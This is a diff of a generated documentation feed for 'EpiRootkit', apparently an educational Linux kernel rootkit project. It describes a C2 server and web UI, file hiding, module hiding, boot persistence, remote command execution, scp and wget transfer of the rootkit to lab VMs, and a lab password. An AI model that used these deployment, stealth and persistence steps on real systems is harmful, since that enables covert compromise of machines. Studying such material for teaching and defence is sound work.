@@ -409,154 +401,17 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="aecd187" class="language-bash ">
+ &lt;pre id="bcc4b5c" class="language-bash ">
  &lt;code># From host project directory
-./scripts/deploy_to_attacker.sh
+./scripts/deploy_project.sh
 
 # ✅ Transfers entire project via SSH/SCP
 # ✅ Runs setup script remotely
-# ✅ Installs all dependencies
+# ✅ Installs dependencies
 # 🎉 Ready to build and start&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="what-it-does">What It Does &lt;a href="#what-it-does" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
-&lt;li>&lt;strong>Checks connectivity&lt;/strong>: VM reachable via SSH&lt;/li>
-&lt;li>&lt;strong>Transfers files&lt;/strong>: Complete project to &lt;code>~/epirootkit&lt;/code>&lt;/li>
-&lt;li>&lt;strong>Runs setup&lt;/strong>: Executes dependency installation&lt;/li>
-&lt;li>&lt;strong>Verifies&lt;/strong>: All components ready&lt;/li>
-&lt;/ol>
-&lt;h3 id="requirements">Requirements &lt;a href="#requirements" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
-&lt;li>VM running with SSH enabled&lt;/li>
-&lt;li>Network connectivity between host and VM&lt;/li>
-&lt;li>VM credentials: &lt;code>attacker@192.168.200.11&lt;/code> (password: &lt;code>jules&lt;/code>)&lt;/li>
-&lt;/ul>
-
-
-&lt;/div>
-
-
-
-
-
-
-
-&lt;div class="tab-pane fade" id="cedfab" role="tabpanel" aria-labelledby="nav-1">
-
-	&lt;h3 id="enable-ssh-in-vm">Enable SSH in VM &lt;a href="#enable-ssh-in-vm" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="882694e" class="language-bash ">
- &lt;code># Inside the VM
-sudo apt update &amp;amp;&amp;amp; sudo apt install -y openssh-server
-sudo systemctl enable --now ssh&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="transfer-files">Transfer Files &lt;a href="#transfer-files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="528a567" class="language-bash ">
- &lt;code># From host to VM
-scp -r /path/to/epirootkit attacker@192.168.200.11:~/
-
-
-# Transfer specific files
-scp deploy_rootkit.sh epirootkit.ko victim@192.168.200.10:~/&lt;/code>
- &lt;/pre>
- &lt;/div>
-
-
-&lt;/div>
-
-
-
-
-
-
-
-&lt;div class="tab-pane fade" id="cfabde" role="tabpanel" aria-labelledby="nav-1">
-
-	&lt;h3 id="setup-server-on-host">Setup Server on Host &lt;a href="#setup-server-on-host" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="d380407" class="language-bash ">
- &lt;code># From project directory
-cd /path/to/epirootkit
-python3 -m http.server 8080&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="download-in-vm">Download in VM &lt;a href="#download-in-vm" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="c335b2d" class="language-bash ">
- &lt;code># Inside VM
-wget http://192.168.200.1:8080/filename
-
-# Download entire project
-wget -r -np -nH --cut-dirs=1 http://192.168.200.1:8080/&lt;/code>
- &lt;/pre>
- &lt;/div>
-
-
-&lt;/div>
-
-
-
-
-
-
-
-&lt;div class="tab-pane fade" id="bfecda" role="tabpanel" aria-labelledby="nav-1">
-
-	&lt;h3 id="shared-folders-development">Shared Folders (Development) &lt;a href="#shared-folders-development" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Add to QEMU launch:&lt;/p></description></item><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h1 id="c2-server-overview">C2 Server Overview &lt;a href="#c2-server-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Command &amp;amp; Control server for managing EpiRootkit connections.&lt;/p>
-&lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;p>&lt;strong>Requirements:&lt;/strong>&lt;/p></description></item><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -664,7 +519,7 @@ persist Client-1 install # Manage persistence&lt;/code>
 &lt;li>Session established (1-hour timeout)&lt;/li>
 &lt;li>Rate limiting: 5 attempts/60 seconds&lt;/li>
 &lt;/ol>
-&lt;p>&lt;strong>Default Credentials:&lt;/strong>&lt;/p></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;h1 id="installation">Installation &lt;a href="#installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Before installing the attacking program, ensure you have:&lt;/p>
+&lt;p>&lt;strong>Default Credentials:&lt;/strong>&lt;/p></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Before installing the attacking program, ensure you have:&lt;/p>
 &lt;ul>
 &lt;li>&lt;strong>Node.js 14+&lt;/strong> and &lt;strong>npm&lt;/strong> (installed via setup script)&lt;/li>
 &lt;li>&lt;strong>Linux environment&lt;/strong> (Ubuntu recommended)&lt;/li>
@@ -697,8 +552,7 @@ npm install
 npm start&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>The server will start on:&lt;/p></description></item><item><title>Command Reference</title><link>/docs/03-attacking-program/commands/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/commands/</guid><description>&lt;h1 id="command-reference">Command Reference &lt;a href="#command-reference" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete reference for all C2 server commands.&lt;/p>
-&lt;h2 id="command-list">Command List &lt;a href="#command-list" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;table>
+&lt;p>The server will start on:&lt;/p></description></item><item><title>Command Reference</title><link>/docs/03-attacking-program/commands/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/commands/</guid><description>&lt;h2 id="command-list">Command List &lt;a href="#command-list" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;table>
  &lt;thead>
  &lt;tr>
  &lt;th>Command&lt;/th>
@@ -799,8 +653,7 @@ auth Client-1 wrongpass # Wrong password
 # ERROR: Authentication failed&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>Security Features:&lt;/strong>&lt;/p></description></item><item><title>Usage &amp; Workflows</title><link>/docs/03-attacking-program/usage/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;h1 id="usage-guide">Usage Guide &lt;a href="#usage-guide" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete workflows for the EpiRootkit C2 server.&lt;/p>
-&lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-start-c2-server">1. Start C2 Server &lt;a href="#1-start-c2-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;p>&lt;strong>Security Features:&lt;/strong>&lt;/p></description></item><item><title>Usage &amp; Workflows</title><link>/docs/03-attacking-program/usage/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-start-c2-server">1. Start C2 Server &lt;a href="#1-start-c2-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -1062,8 +915,7 @@ unhide_module Client-1
 hide_files Client-1
 # SUCCESS: File hiding enabled&lt;/code>
  &lt;/pre>
- &lt;/div></description></item><item><title>Overview</title><link>/docs/04-web-ui/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/overview/</guid><description>&lt;h1 id="web-ui-overview">Web UI Overview &lt;a href="#web-ui-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Modern React-based web interface for EpiRootkit C2 management.&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/webui/dashboard.png"
+ &lt;/div></description></item><item><title>Overview</title><link>/docs/04-web-ui/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/overview/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/dashboard.png"
  alt="C2 Dashboard Main">
 &lt;/figure>
 
@@ -1119,7 +971,7 @@ hide_files Client-1
 &lt;li>&lt;strong>Authentication Panel&lt;/strong>: Client authentication management&lt;/li>
 &lt;li>&lt;strong>Event Log Panel&lt;/strong>: Real-time activity monitoring&lt;/li>
 &lt;/ul>
-&lt;h2 id="integration">Integration &lt;a href="#integration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The Web UI integrates with the &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/overview/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Installation &amp; Setup</title><link>/docs/04-web-ui/installation/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/installation/</guid><description>&lt;h1 id="web-ui-installation">Web UI Installation &lt;a href="#web-ui-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>The Web UI is integrated with the C2 server and launches automatically.&lt;/p>
+&lt;h2 id="integration">Integration &lt;a href="#integration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The Web UI integrates with the &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/overview/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Installation &amp; Setup</title><link>/docs/04-web-ui/installation/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/installation/</guid><description>&lt;p>The Web UI is integrated with the C2 server and launches automatically.&lt;/p>
 &lt;h2 id="quick-setup">Quick Setup &lt;a href="#quick-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
@@ -1168,8 +1020,7 @@ pnpm install
 pnpm start&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>For detailed configuration options, see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/installation/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Authentication</title><link>/docs/04-web-ui/features/authentication/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/authentication/</guid><description>&lt;h1 id="authentication">Authentication &lt;a href="#authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Secure login with JWT tokens and automatic session management.&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/webui/login.png"
+&lt;p>For detailed configuration options, see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/installation/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Authentication</title><link>/docs/04-web-ui/features/authentication/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/authentication/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/login.png"
  alt="Login Screen">
 &lt;/figure>
 
@@ -1178,8 +1029,7 @@ pnpm start&lt;/code>
 &lt;li>&lt;strong>Auto-logout&lt;/strong>: Automatic logout when session expires (1 hour)&lt;/li>
 &lt;li>&lt;strong>Client Authentication&lt;/strong>: Authenticate individual rootkit clients&lt;/li>
 &lt;li>&lt;strong>Persistent Sessions&lt;/strong>: Survives browser refresh&lt;/li>
-&lt;/ul></description></item><item><title>Dashboard</title><link>/docs/04-web-ui/features/dashboard/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/dashboard/</guid><description>&lt;h1 id="dashboard">Dashboard &lt;a href="#dashboard" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Main interface for monitoring connected rootkit clients with real-time statistics.&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/webui/dashboard.png"
+&lt;/ul></description></item><item><title>Dashboard</title><link>/docs/04-web-ui/features/dashboard/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/dashboard/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/dashboard.png"
  alt="Dashboard Overview">
 &lt;/figure>
 
@@ -1189,15 +1039,13 @@ pnpm start&lt;/code>
 &lt;li>&lt;strong>Real-time Search&lt;/strong>: Filter clients by ID, IP, or status&lt;/li>
 &lt;li>&lt;strong>Status Indicators&lt;/strong>: Color-coded connection states (Green/Yellow/Red)&lt;/li>
 &lt;li>&lt;strong>Quick Actions&lt;/strong>: One-click authentication and client management&lt;/li>
-&lt;/ul></description></item><item><title>Client Management</title><link>/docs/04-web-ui/features/client-management/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/client-management/</guid><description>&lt;h1 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Monitor and interact with connected rootkit clients in real-time.&lt;/p>
-&lt;h2 id="features">Features &lt;a href="#features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;/ul></description></item><item><title>Client Management</title><link>/docs/04-web-ui/features/client-management/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/client-management/</guid><description>&lt;h2 id="features">Features &lt;a href="#features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>&lt;strong>Connection Status&lt;/strong>: Visual indicators (Green/Yellow/Red) for client state&lt;/li>
 &lt;li>&lt;strong>Client Authentication&lt;/strong>: Secure password-based client authentication&lt;/li>
 &lt;li>&lt;strong>Real-time Updates&lt;/strong>: Live connection and status changes via WebSocket&lt;/li>
 &lt;li>&lt;strong>Client Information&lt;/strong>: ID, IP address, last seen timestamps&lt;/li>
 &lt;li>&lt;strong>Health Monitoring&lt;/strong>: Automatic stale client detection and alerts&lt;/li>
-&lt;/ul></description></item><item><title>Terminal Panel</title><link>/docs/04-web-ui/features/panels/terminal-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/terminal-panel/</guid><description>&lt;h1 id="terminal-panel">Terminal Panel &lt;a href="#terminal-panel" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Full terminal emulator for remote command execution with history and real-time output.&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/webui/terminal-panel.png"
+&lt;/ul></description></item><item><title>Terminal Panel</title><link>/docs/04-web-ui/features/panels/terminal-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/terminal-panel/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/terminal-panel.png"
  alt="Terminal Panel">
 &lt;/figure>
 
@@ -1207,8 +1055,7 @@ pnpm start&lt;/code>
 &lt;li>&lt;strong>Quick Commands&lt;/strong>: One-click shortcuts for common operations&lt;/li>
 &lt;li>&lt;strong>Status Indicators&lt;/strong>: Visual execution and connection status&lt;/li>
 &lt;li>&lt;strong>Parsed Display&lt;/strong>: Output without C2 metadata&lt;/li>
-&lt;/ul></description></item><item><title>Persistence Panel</title><link>/docs/04-web-ui/features/panels/persistence-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/persistence-panel/</guid><description>&lt;h1 id="persistence-panel">Persistence Panel &lt;a href="#persistence-panel" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Configure rootkit boot survival with multiple persistence methods and one-click setup.&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/webui/persistence-panel.png"
+&lt;/ul></description></item><item><title>Persistence Panel</title><link>/docs/04-web-ui/features/panels/persistence-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/persistence-panel/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/persistence-panel.png"
  alt="Persistence Panel">
 &lt;/figure>
 
@@ -1239,8 +1086,7 @@ pnpm start&lt;/code>
 &lt;/ul>
 &lt;/li>
 &lt;li>&lt;strong>Behavior&lt;/strong>: Activates on root login, includes duplicate detection&lt;/li>
-&lt;/ul></description></item><item><title>Event Log Panel</title><link>/docs/04-web-ui/features/panels/event-log-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/event-log-panel/</guid><description>&lt;h1 id="event-log-panel">Event Log Panel &lt;a href="#event-log-panel" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Real-time activity monitoring with filtering, search, and export capabilities.&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/webui/event-log-panel.png"
+&lt;/ul></description></item><item><title>Event Log Panel</title><link>/docs/04-web-ui/features/panels/event-log-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/event-log-panel/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/event-log-panel.png"
  alt="Event Log Panel">
 &lt;/figure>
 
@@ -1250,15 +1096,13 @@ pnpm start&lt;/code>
 &lt;li>&lt;strong>Search Functionality&lt;/strong>: Text search with regex support&lt;/li>
 &lt;li>&lt;strong>Export Logs&lt;/strong>: Download events as JSON for analysis&lt;/li>
 &lt;li>&lt;strong>Color Coding&lt;/strong>: Visual event type identification&lt;/li>
-&lt;/ul></description></item><item><title>Upload/Download Panel</title><link>/docs/04-web-ui/features/panels/upload-download-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/upload-download-panel/</guid><description>&lt;h1 id="uploaddownload-panel">Upload/Download Panel &lt;a href="#uploaddownload-panel" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>File transfer interface with drag-and-drop upload and remote file browser.&lt;/p>
-&lt;h2 id="features">Features &lt;a href="#features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;/ul></description></item><item><title>Upload/Download Panel</title><link>/docs/04-web-ui/features/panels/upload-download-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/upload-download-panel/</guid><description>&lt;h2 id="features">Features &lt;a href="#features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>&lt;strong>Drag-and-Drop Upload&lt;/strong>: Large drop zone for easy file uploads&lt;/li>
 &lt;li>&lt;strong>Remote File Browser&lt;/strong>: Navigate and download from target filesystem&lt;/li>
 &lt;li>&lt;strong>Progress Tracking&lt;/strong>: Real-time transfer progress bars&lt;/li>
 &lt;li>&lt;strong>Transfer History&lt;/strong>: Track all upload/download operations&lt;/li>
 &lt;li>&lt;strong>Error Handling&lt;/strong>: Error messages and retry options&lt;/li>
-&lt;/ul></description></item><item><title>Overview Panel</title><link>/docs/04-web-ui/features/panels/overview-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/overview-panel/</guid><description>&lt;h1 id="overview-panel">Overview Panel &lt;a href="#overview-panel" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Client status dashboard with connection monitoring, stealth feature status, and quick action buttons.&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/webui/overview-panel.png"
+&lt;/ul></description></item><item><title>Overview Panel</title><link>/docs/04-web-ui/features/panels/overview-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/overview-panel/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/overview-panel.png"
  alt="Overview Panel">
 &lt;/figure>
 
@@ -1269,8 +1113,7 @@ pnpm start&lt;/code>
 &lt;li>&lt;strong>System Information&lt;/strong>: Client ID, IP address, and OS details&lt;/li>
 &lt;li>&lt;strong>Quick Actions&lt;/strong>: One-click authentication and management&lt;/li>
 &lt;li>&lt;strong>Visual Indicators&lt;/strong>: Color-coded status with progress animations&lt;/li>
-&lt;/ul></description></item><item><title>Configuration Panel</title><link>/docs/04-web-ui/features/panels/configuration-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/configuration-panel/</guid><description>&lt;h1 id="configuration-panel">Configuration Panel &lt;a href="#configuration-panel" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Manage rootkit stealth settings with toggle switches and real-time updates.&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/webui/configuration-panel.png"
+&lt;/ul></description></item><item><title>Configuration Panel</title><link>/docs/04-web-ui/features/panels/configuration-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/configuration-panel/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/configuration-panel.png"
  alt="Configuration Panel">
 &lt;/figure>
 
@@ -1287,8 +1130,7 @@ pnpm start&lt;/code>
 &lt;li>&lt;strong>Status Display&lt;/strong>: Current state (Enabled/Disabled/Unknown)&lt;/li>
 &lt;li>&lt;strong>Visual Indicators&lt;/strong>: Color-coded status icons&lt;/li>
 &lt;li>&lt;strong>Loading States&lt;/strong>: Progress feedback during changes&lt;/li>
-&lt;/ul></description></item><item><title>Authentication Panel</title><link>/docs/04-web-ui/features/panels/authentication-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/authentication-panel/</guid><description>&lt;h1 id="authentication-panel">Authentication Panel &lt;a href="#authentication-panel" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Secure two-layer authentication system for rootkit client access and control.&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/webui/auth-panel.png"
+&lt;/ul></description></item><item><title>Authentication Panel</title><link>/docs/04-web-ui/features/panels/authentication-panel/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/panels/authentication-panel/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/auth-panel.png"
  alt="Authentication Panel">
 &lt;/figure>
 
@@ -1347,8 +1189,7 @@ pnpm start&lt;/code>
 5.8.x ← UEFI Secure Boot enables lockdown automatically&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>Result&lt;/strong>: 5.4.0 provides modern kernel features without the security restrictions that complicate rootkit development.&lt;/p></description></item><item><title>EpiRootkit Overview</title><link>/docs/05-epirootkit/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/05-epirootkit/overview/</guid><description>&lt;h1 id="epirootkit">EpiRootkit &lt;a href="#epirootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Linux kernel rootkit implementation for Ubuntu 20.04 LTS (kernel 5.4.0).&lt;/p>
-&lt;h2 id="features">Features &lt;a href="#features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;p>&lt;strong>Result&lt;/strong>: 5.4.0 provides modern kernel features without the security restrictions that complicate rootkit development.&lt;/p></description></item><item><title>EpiRootkit Overview</title><link>/docs/05-epirootkit/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/05-epirootkit/overview/</guid><description>&lt;h2 id="features">Features &lt;a href="#features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>&lt;strong>C2 Communication&lt;/strong>: TCP connection with domain support and XOR encryption&lt;/li>
 &lt;li>&lt;strong>DNS Resolution&lt;/strong>: Kernel-space domain name resolution&lt;/li>
 &lt;li>&lt;strong>Remote Commands&lt;/strong>: Execute shell commands with output capture&lt;/li>
@@ -1432,8 +1273,7 @@ cat /sys/kernel/epirootkit/hide # Check: 7&lt;/code>
 &lt;li>&lt;strong>Encryption&lt;/strong>: XOR cipher with 32-byte hardcoded key&lt;/li>
 &lt;li>&lt;strong>Authentication&lt;/strong>: SHA-512 with rate limiting (5 attempts/60s)&lt;/li>
 &lt;/ul>
-&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Edit &lt;code>rootkit/core/config.h&lt;/code>:&lt;/p></description></item><item><title>Build &amp; Deployment</title><link>/docs/05-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/deployment/</guid><description>&lt;h1 id="build--deployment">Build &amp;amp; Deployment &lt;a href="#build--deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.&lt;/p>
-&lt;h2 id="requirements">Requirements &lt;a href="#requirements" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="system">System &lt;a href="#system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
